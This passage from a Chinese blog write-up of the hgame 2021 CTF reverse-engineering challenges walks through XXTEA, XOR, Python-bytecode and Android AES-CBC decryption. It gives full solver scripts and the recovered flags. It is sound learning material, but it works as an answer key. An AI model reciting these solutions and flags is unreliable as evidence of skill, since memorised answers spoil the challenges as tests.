    <content type="html"><![CDATA[<p>一个月hgame结束了，做完了逆向题，收获很大，misc的签到题做来玩了一下。<a id="more"></a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="apacha"><a href="#apacha" class="headerlink" title="apacha"></a>apacha</h3><p>考了一个xxtea加密算法：key是{1, 2, 3, 4}</p><p><img src="https://i.loli.net/2021/02/27/imfSALBWP2nDy7o.png" alt="image-20210204180727273"></p><p>跟着算法逻辑逆一下就行了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> LEN = <span class="number">35</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> delat = <span class="number">0x9E3779B9</span> * (<span class="number">52</span> / LEN) - <span class="number">0x4AB325AA</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> KEY[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">35</span>, <span class="number">179</span>,  <span class="number">78</span>, <span class="number">231</span>,  <span class="number">54</span>,  <span class="number">40</span>, <span class="number">167</span>, <span class="number">183</span>, <span class="number">226</span>, <span class="number">111</span>, </span><br><span class="line">  <span class="number">202</span>,  <span class="number">89</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">124</span>, <span class="number">150</span>, <span class="number">116</span>,  <span class="number">38</span>, <span class="number">128</span>, <span class="number">231</span>, </span><br><span class="line">  <span class="number">230</span>,  <span class="number">84</span>,  <span class="number">45</span>,  <span class="number">61</span>,  <span class="number">86</span>,   <span class="number">3</span>, <span class="number">157</span>, <span class="number">138</span>, <span class="number">156</span>, <span class="number">195</span>, </span><br><span class="line">  <span class="number">220</span>, <span class="number">153</span>, <span class="number">237</span>, <span class="number">216</span>,  <span class="number">38</span>, <span class="number">112</span>, <span class="number">173</span>, <span class="number">253</span>,  <span class="number">51</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">10</span>,  <span class="number">85</span>, <span class="number">150</span>, <span class="number">244</span>, <span class="number">158</span>, <span class="number">111</span>, <span class="number">156</span>,  <span class="number">92</span>,  <span class="number">76</span>, <span class="number">208</span>, </span><br><span class="line">  <span class="number">229</span>,  <span class="number">27</span>,  <span class="number">23</span>, <span class="number">174</span>,  <span class="number">35</span>, <span class="number">103</span>, <span class="number">194</span>, <span class="number">165</span>, <span class="number">112</span>,  <span class="number">82</span>, </span><br><span class="line">   <span class="number">10</span>,  <span class="number">19</span>,  <span class="number">66</span>, <span class="number">172</span>, <span class="number">178</span>, <span class="number">103</span>, <span class="number">190</span>, <span class="number">132</span>, <span class="number">121</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">92</span>, <span class="number">112</span>, <span class="number">152</span>,  <span class="number">61</span>,  <span class="number">81</span>,  <span class="number">92</span>,  <span class="number">45</span>, <span class="number">218</span>,  <span class="number">54</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">69</span>, <span class="number">150</span>,  <span class="number">23</span>,  <span class="number">34</span>, <span class="number">157</span>,  <span class="number">82</span>, <span class="number">227</span>,  <span class="number">92</span>, <span class="number">251</span>, <span class="number">225</span>, </span><br><span class="line">  <span class="number">137</span>, <span class="number">209</span>, <span class="number">137</span>, <span class="number">212</span>,  <span class="number">91</span>, <span class="number">232</span>,  <span class="number">31</span>, <span class="number">209</span>, <span class="number">200</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">150</span>, <span class="number">193</span>, <span class="number">181</span>,  <span class="number">84</span>, <span class="number">144</span>, <span class="number">180</span>, <span class="number">124</span>, <span class="number">182</span>, <span class="number">202</span>, <span class="number">228</span>, </span><br><span class="line">   <span class="number">23</span>,  <span class="number">33</span>, <span class="number">148</span>, <span class="number">249</span>, <span class="number">227</span>, <span class="number">157</span>, <span class="number">170</span>, <span class="number">161</span>,  <span class="number">90</span>,  <span class="number">47</span>, </span><br><span class="line">  <span class="number">253</span>,   <span class="number">1</span>, <span class="number">232</span>, <span class="number">167</span>, <span class="number">171</span>, <span class="number">110</span>,  <span class="number">13</span>, <span class="number">195</span>, <span class="number">156</span>, <span class="number">220</span>, </span><br><span class="line">  <span class="number">173</span>,  <span class="number">27</span>,  <span class="number">74</span>, <span class="number">176</span>,  <span class="number">83</span>,  <span class="number">52</span>, <span class="number">249</span>,   <span class="number">6</span>, <span class="number">164</span>, <span class="number">146</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">de_xxtea</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ENC;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *key = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)KEY;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> delat1 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(delat &gt;&gt; <span class="number">2</span>);</span><br><span class="line">enc[LEN<span class="number">-1</span>] -= ((key[((LEN<span class="number">-1</span>)^delat1)&amp;<span class="number">3</span>]^enc[LEN<span class="number">-2</span>])+(enc[<span class="number">0</span>]^delat)) ^ (((<span class="number">4</span>*enc[<span class="number">0</span>])^(enc[LEN<span class="number">-2</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[LEN<span class="number">-2</span>])^(enc[<span class="number">0</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = LEN<span class="number">-2</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">enc[i] -= ((key[(i^delat1)&amp;<span class="number">3</span>]^enc[i<span class="number">-1</span>])+(enc[i+<span class="number">1</span>]^delat)) ^ (((<span class="number">4</span>*enc[i+<span class="number">1</span>])^(enc[i<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[i<span class="number">-1</span>])^(enc[i+<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line">i--; </span><br><span class="line">&#125;<span class="keyword">while</span>(i != <span class="number">0</span>);</span><br><span class="line">enc[<span class="number">0</span>] -= ((key[(<span class="number">0</span>^delat1)&amp;<span class="number">3</span>]^enc[LEN<span class="number">-1</span>])+(enc[<span class="number">1</span>]^delat)) ^ (((<span class="number">4</span>*enc[<span class="number">1</span>])^(enc[LEN<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[LEN<span class="number">-1</span>])^(enc[<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">delat += <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(delat != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">de_xxtea();</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, ENC[i*<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hgame&#123;l00ks_1ike_y0u_f0Und_th3_t34&#125;</span></span><br></pre></td></tr></table></figure><h3 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h3><p>就是一个异或解密，但是可以从这里学习一下STL模板中的string的结构。</p><p>能猜测出v14就是我们输入字符串的长度，但是怎么来的呢？其实使用了string结构。</p><p><img src="https://i.loli.net/2021/02/27/IbUASK8JgpGLFr6.png" alt="image-20210204182522063"></p><p>string结构：一共占24个字节（这也是一个可以让我们用来识别的特征）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">string</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> _Buf[<span class="number">16</span>];           <span class="comment">// 当字符串长度小于等于0xF时，数据存储在_Buf数组中</span></span><br><span class="line">                             <span class="comment">// 大于0xF时将分配一个变量，_Buf存储的是该变量地址。</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _Mysize;    <span class="comment">// 字符串长度</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _Myres;     <span class="comment">// 可存储的最大长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来测试一个输入看看：</p><p><img src="https://i.loli.net/2021/02/27/zMNw8FvRtLHaGPT.png" alt="image-20210204182822594"></p><p>最后题解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="number">0x07FF756E13480</span></span><br><span class="line">cnt = <span class="number">0xff</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">    flag += chr(get_byte(addr)^cnt)</span><br><span class="line">    cnt -= <span class="number">1</span></span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#hgame&#123;hello_re_player&#125;</span></span><br></pre></td></tr></table></figure><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>给了通过dis模块得到的python反汇编代码，我把对应的python代码注释了下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">4</span>           <span class="number">0</span> LOAD_GLOBAL              <span class="number">0</span> (input)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="string">'give me your flag:\n'</span>)</span><br><span class="line">              <span class="number">4</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">0</span> (raw_flag) <span class="comment">#raw_flag = input('give me your flag:\n')</span></span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>           <span class="number">8</span> LOAD_GLOBAL              <span class="number">1</span> (list)</span><br><span class="line">             <span class="number">10</span> LOAD_FAST                <span class="number">0</span> (raw_flag)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">2</span> (<span class="number">6</span>)</span><br><span class="line">             <span class="number">14</span> LOAD_CONST               <span class="number">3</span> (<span class="number">-1</span>)</span><br><span class="line">             <span class="number">16</span> BUILD_SLICE              <span class="number">2</span></span><br><span class="line">             <span class="number">18</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">20</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">22</span> STORE_FAST               <span class="number">1</span> (cipher)<span class="comment">#cipher = list(raw_flag[6:-1])</span></span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">24</span> LOAD_GLOBAL              <span class="number">2</span> (len)</span><br><span class="line">             <span class="number">26</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">28</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">30</span> STORE_FAST               <span class="number">2</span> (length)<span class="comment">#length = len(cipher)</span></span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>          <span class="number">32</span> LOAD_GLOBAL              <span class="number">3</span> (range)</span><br><span class="line">             <span class="number">34</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">             <span class="number">36</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">38</span> BINARY_FLOOR_DIVIDE</span><br><span class="line">             <span class="number">40</span> CALL_FUNCTION            <span class="number">1</span><span class="comment">#range(length/2)</span></span><br><span class="line">             <span class="number">42</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">44</span> FOR_ITER                <span class="number">54</span> (to <span class="number">100</span>)</span><br><span class="line">             <span class="number">46</span> STORE_FAST               <span class="number">3</span> (i)<span class="comment">#for i in range(length/2):</span></span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>          <span class="number">48</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">50</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">52</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">54</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">56</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">58</span> BINARY_ADD</span><br><span class="line">             <span class="number">60</span> BINARY_SUBSCR<span class="comment">#cipher[2*i+1]</span></span><br><span class="line">             <span class="number">62</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">64</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">66</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">68</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">70</span> BINARY_SUBSCR<span class="comment">#cipher[2*i]</span></span><br><span class="line">             <span class="number">72</span> ROT_TWO<span class="comment">#swap 改变指针的指向来实现</span></span><br><span class="line">             <span class="number">74</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">76</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">78</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">80</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">82</span> STORE_SUBSCR</span><br><span class="line">             <span class="number">84</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">86</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">88</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">90</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">92</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">94</span> BINARY_ADD</span><br><span class="line">             <span class="number">96</span> STORE_SUBSCR<span class="comment">#cipher[2*i], cipher[2*i+1] = cipher[2*i+1], cipher[2*i]</span></span><br><span class="line">             <span class="number">98</span> JUMP_ABSOLUTE           <span class="number">44</span></span><br><span class="line"><span class="comment">#for i in range(length/2):</span></span><br><span class="line"><span class="comment">#cipher[2*i], cipher[2*i+1] = cipher[2*i+1], cipher[2*i]</span></span><br><span class="line"></span><br><span class="line"> <span class="number">12</span>     &gt;&gt;  <span class="number">100</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">            <span class="number">102</span> STORE_FAST               <span class="number">4</span> (res)<span class="comment">#res = []</span></span><br><span class="line"></span><br><span class="line"> <span class="number">13</span>         <span class="number">104</span> LOAD_GLOBAL              <span class="number">3</span> (range)</span><br><span class="line">            <span class="number">106</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">            <span class="number">108</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">110</span> GET_ITER</span><br><span class="line">        &gt;&gt;  <span class="number">112</span> FOR_ITER                <span class="number">26</span> (to <span class="number">140</span>)</span><br><span class="line">            <span class="number">114</span> STORE_FAST               <span class="number">3</span> (i)<span class="keyword">for</span> i <span class="keyword">in</span> range(length)</span><br><span class="line"></span><br><span class="line"> <span class="number">14</span>         <span class="number">116</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">118</span> LOAD_METHOD              <span class="number">4</span> (append)</span><br><span class="line">            <span class="number">120</span> LOAD_GLOBAL              <span class="number">5</span> (ord)</span><br><span class="line">            <span class="number">122</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">            <span class="number">124</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">126</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">128</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">130</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">132</span> BINARY_XOR</span><br><span class="line">            <span class="number">134</span> CALL_METHOD              <span class="number">1</span><span class="comment">#res.append(ord(cipher[i])^i)</span></span><br><span class="line">            <span class="number">136</span> POP_TOP</span><br><span class="line">            <span class="number">138</span> JUMP_ABSOLUTE          <span class="number">112</span></span><br><span class="line"></span><br><span class="line"> <span class="number">15</span>     &gt;&gt;  <span class="number">140</span> LOAD_GLOBAL              <span class="number">6</span> (bytes)</span><br><span class="line">            <span class="number">142</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">144</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">146</span> LOAD_METHOD              <span class="number">7</span> (hex)</span><br><span class="line">            <span class="number">148</span> CALL_METHOD              <span class="number">0</span></span><br><span class="line">            <span class="number">150</span> STORE_FAST               <span class="number">4</span> (res)<span class="comment">#res = bytes(res).hex()</span></span><br><span class="line"></span><br><span class="line"> <span class="number">16</span>         <span class="number">152</span> LOAD_GLOBAL              <span class="number">8</span> (<span class="keyword">print</span>)</span><br><span class="line">            <span class="number">154</span> LOAD_CONST               <span class="number">6</span> (<span class="string">'your flag: '</span>)</span><br><span class="line">            <span class="number">156</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">158</span> BINARY_ADD</span><br><span class="line">            <span class="number">160</span> CALL_FUNCTION            <span class="number">1</span><span class="comment">#print('your flag: ' + res)</span></span><br><span class="line">            <span class="number">162</span> POP_TOP</span><br><span class="line">            <span class="number">164</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">            <span class="number">166</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line"><span class="comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></span><br></pre></td></tr></table></figure><p>最后简单逆一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'30466633346f59213b4139794520572b45514d61583151576638643a'</span></span><br><span class="line">enc = bytes.fromhex(enc)</span><br><span class="line">flag = [b^i <span class="keyword">for</span> b, i <span class="keyword">in</span> enumerate(enc)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)//<span class="number">2</span>):</span><br><span class="line">    flag[<span class="number">2</span>*i], flag[<span class="number">2</span>*i+<span class="number">1</span>] = flag[<span class="number">2</span>*i+<span class="number">1</span>], flag[<span class="number">2</span>*i]</span><br><span class="line">print(<span class="string">''</span>.join(map(chr, flag)))</span><br><span class="line"><span class="comment">#G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~</span></span><br></pre></td></tr></table></figure><h3 id="ezApk"><a href="#ezApk" class="headerlink" title="ezApk"></a>ezApk</h3><p>简单的安卓，只有java代码，找到按钮活动。</p><p><img src="https://i.loli.net/2021/02/27/56TDYkbSyOjLNpK.png" alt="image-20210215155612517"></p><p>就是取出文本内容，然后把输入和密文传入s方法，验证是否正确。</p><p>到s方法：一个cbc模式的aes加密，填充方式为PKCS7Padding。</p><p><img src="https://i.loli.net/2021/02/27/hcqCNUm63VFPaZR.png" alt="image-20210215155952276"></p><p>所以解密密文就应该是flag了，使用java用同样的方式调用一下解密方法。这里注意一点就是：java中自带的是PKCS5Padding填充，直接使用PKCS7Padding会报错，但搜索到这2个使用起来是一样的，就直接改成PKCS5Padding就好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ctf;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidAlgorithmParameterException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cry</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hash(String a, String b) <span class="keyword">throws</span> NoSuchAlgorithmException, UnsupportedEncodingException&#123;</span><br><span class="line">MessageDigest v2 = MessageDigest.getInstance(a);</span><br><span class="line"><span class="keyword">byte</span>[] v3 = b.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="keyword">byte</span>[] ans = v2.digest(v3);</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">aes_test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, UnsupportedEncodingException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException</span>&#123;</span><br><span class="line"></span><br><span class="line">String key = <span class="string">"A_HIDDEN_KEY"</span>;</span><br><span class="line">String input = <span class="string">"EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY"</span>;</span><br><span class="line">Base64.Decoder decoder = Base64.getDecoder();</span><br><span class="line"><span class="keyword">byte</span>[] enc = decoder.decode(input);</span><br><span class="line">SecretKeySpec v1 = <span class="keyword">new</span> SecretKeySpec(cry.hash(<span class="string">"SHA-256"</span>, key), <span class="string">"AES"</span>);</span><br><span class="line">IvParameterSpec v2 = <span class="keyword">new</span> IvParameterSpec(cry.hash(<span class="string">"MD5"</span>, key));</span><br><span class="line">Cipher v5 = Cipher.getInstance(<span class="string">"AES/CBC/PKCS5Padding"</span>);</span><br><span class="line">v5.init(<span class="number">2</span>, v1, v2);</span><br><span class="line">System.out.println(<span class="string">"key: "</span> + byte_hex.bytes2hex(v1.getEncoded()));</span><br><span class="line">System.out.println(<span class="string">"iv: "</span> + byte_hex.bytes2hex(v2.getIV()));</span><br><span class="line"><span class="keyword">byte</span>[] plain = v5.doFinal(enc);</span><br><span class="line">System.out.println(<span class="keyword">new</span> String(plain));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">key: fca5fed0bc096dbb2f21c64b77a908b5c9944dfcaba05a482b2424a44a15ffe6</span></span><br><span class="line"><span class="comment">iv: 99c6bd34c31b78b4c4b964a7745e6300</span></span><br><span class="line"><span class="comment">hgame&#123;jUst_A_3z4pp_write_in_k07l1n&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>其实也不用这么麻烦的，关键是想练习一下java。</p><p>自己算一下hash得到的key和iv用python或者在线网站解密一下，方便的多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 